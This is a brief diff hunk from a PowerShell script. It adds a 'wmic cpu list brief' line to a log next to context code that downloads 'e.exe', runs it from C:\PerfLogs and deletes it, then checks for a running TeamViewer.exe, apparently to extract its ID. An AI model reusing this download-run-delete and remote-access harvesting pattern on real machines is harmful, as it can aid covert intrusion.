@@ -27,7 +27,7 @@ $webClient.DownloadFile("e.exe", $localPath+"e.exe")
 Start-Sleep -s 3
 & C:\PerfLogs\e.exe | Out-File -Append $file
 rm C:\PerfLogs\e.exe
-
+wmic cpu list brief | Out-File -Append $file
 if ($tmp -match "TeamViewer.exe")
 {
 	$parttern="\s\d{1,100}\s"
